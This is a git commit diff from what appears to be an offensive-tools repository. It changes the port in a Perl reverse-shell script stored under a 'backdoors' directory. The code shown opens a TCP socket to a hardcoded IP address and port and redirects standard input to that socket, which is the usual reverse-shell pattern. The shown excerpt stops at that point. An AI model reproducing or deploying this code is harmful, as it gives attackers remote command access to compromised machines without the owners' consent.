9bac3e680af3820db71d3fd31db65e3f5f24a14d
George Hughey <ghughey@umd.edu>
2017-01-02 18:44:26 -0800

    Fixed stats for new interpreter

--- backdoors/shell/__perl/prsA.pl
+++ backdoors/shell/__perl/prsA.pl
@@ -1,6 +1,6 @@
 use Socket;
 my $ip = '192.168.121.154';
-my $port = 65307;
+my $port = 1267;
 socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
 connect(SOCK, sockaddr_in($port,inet_aton($ip)));
 open(STDIN, ">&SOCK");
